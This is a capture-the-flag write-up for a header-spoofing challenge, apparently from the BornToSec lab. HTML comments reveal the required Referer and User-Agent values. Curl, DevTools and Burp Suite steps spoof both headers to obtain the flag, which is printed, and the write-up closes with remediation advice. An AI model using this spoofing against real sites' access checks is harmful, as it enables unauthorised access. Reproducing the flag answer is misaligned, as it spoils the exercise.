# Header Spoofing - Referer and User-Agent Manipulation

## Breach Type
**Security Misconfiguration / Broken Access Control** — OWASP Top 10: A01:2021 Broken Access Control

## What is this Vulnerability?
**HTTP Header Spoofing** is a vulnerability where the server uses HTTP request headers (like `Referer` and `User-Agent`) for access control decisions. These headers are **entirely controlled by the client** and can be set to any value using curl, browser extensions, or proxy tools like Burp Suite.

HTTP headers explained:
- **`Referer`** header: tells the server which page the user came from (e.g., if you click a link on Google, the Referer is `https://google.com`). It's meant for analytics, not security.
- **`User-Agent`** header: identifies the browser/software making the request (e.g., `Mozilla/5.0 Chrome/120...`). It's meant for compatibility, not authentication.

Using these headers for access control is like a nightclub bouncer letting you in because you *say* you're on the VIP list — without actually checking. Anyone can claim any Referer or User-Agent.

Additionally, the access requirements were hidden in **HTML comments** (`<!-- You must come from : "https://www.nsa.gov/" -->`), which is visible to anyone who views the page source. HTML comments should never contain security-sensitive information.

### Why is it dangerous?
- **Trivially bypassable**: Any HTTP client (curl, Postman, browser extensions) can set custom headers
- **False sense of security**: Developers think they've restricted access, but the restriction is meaningless
- **Information leakage**: HTML comments reveal security logic to attackers
- **Automated exploitation**: Bots can be configured with specific headers in seconds
- **No logging deterrent**: The server has no way to distinguish spoofed headers from legitimate ones

### Real-world impact
Many legacy applications and IoT devices use User-Agent or Referer for access control. The 2013 Target breach initially exploited weak access controls. Header-based security bypass is a common finding in penetration tests.

## Where
URL: `http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
The copyright/footer page (accessible from the "BornToSec" or "© BornToSec" link).

## How I Found It
1. Noticed the **© BornToSec** link in the footer of each page.
2. Clicking it navigates to `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`.
3. Inspected the HTML source of this page and found **HTML comments** containing clues:
   ```html
   <!--
   You must come from : "https://www.nsa.gov/"
   -->
   <!--
   Let's use this browser : "ft_bornToSec". It will help you a lot.
   -->
   ```
4. These hints tell us to:
   - Set the `Referer` header to `https://www.nsa.gov/`
   - Set the `User-Agent` header to `ft_bornToSec`

## Step-by-Step Exploitation

### Step 1: Find the Copyright Page
Click the © BornToSec link or navigate to:
```
http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

### Step 2: View Page Source for Clues
```bash
curl -s "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep "<!--"
```
Output:
```html
<!-- You must come from : "https://www.nsa.gov/" -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
```

### Step 3: Send Request with Spoofed Headers
```bash
curl -s "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
  -H "Referer: https://www.nsa.gov/" \
  -H "User-Agent: ft_bornToSec"
```

### Step 4: Get the Flag
```
The flag is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to Test Manually

### Method 1: Using curl
```bash
curl "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
  -H "Referer: https://www.nsa.gov/" \
  -H "User-Agent: ft_bornToSec"
```

### Method 2: Using Browser DevTools
1. Open `http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
2. Open DevTools (F12) → **Network** tab
3. Right-click the page request → **Edit and Resend** (in Firefox)
4. Add/modify headers:
   - `Referer: https://www.nsa.gov/`
   - `User-Agent: ft_bornToSec`
5. Send the request and inspect the response

### Method 3: Using Burp Suite (Built-in Browser)
1. Open Burp Suite and go to the Proxy tab.
2. Click "Open browser" to launch Burp's built-in browser (no manual proxy setup needed).
3. In the built-in browser, first visit the home page (or any other page on the site).
4. Click the © BornToSec link at the bottom to navigate to the target page. This way, the browser will automatically include a Referer header.
5. With Intercept on, capture the request in Burp.
6. If the Referer header is missing or incorrect, add or modify it in the intercepted request:
  - `Referer: https://www.nsa.gov/`
  - `User-Agent: ft_bornToSec`
7. Forward the request and review the response for the flag.
> **Note:** If you access the target URL directly, the Referer header will not be present. You must add it manually in Burp Suite before forwarding the request.

## How to Fix
- **Never use HTTP headers for access control** — headers like `Referer` and `User-Agent` are trivially spoofed by clients
- **Use proper authentication mechanisms** — tokens, sessions, API keys
- **Don't put security-sensitive hints in HTML comments** — always strip comments in production builds
- **Implement server-side access control** that doesn't rely on client-supplied metadata
- If you need to verify origin, use:
  - **CORS** (Cross-Origin Resource Sharing) headers for API endpoints
  - **CSRF tokens** for form submissions
  - **Server-side session validation**
- **Remove HTML comments** from production code using build tools or template engines

## OWASP Reference
- [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
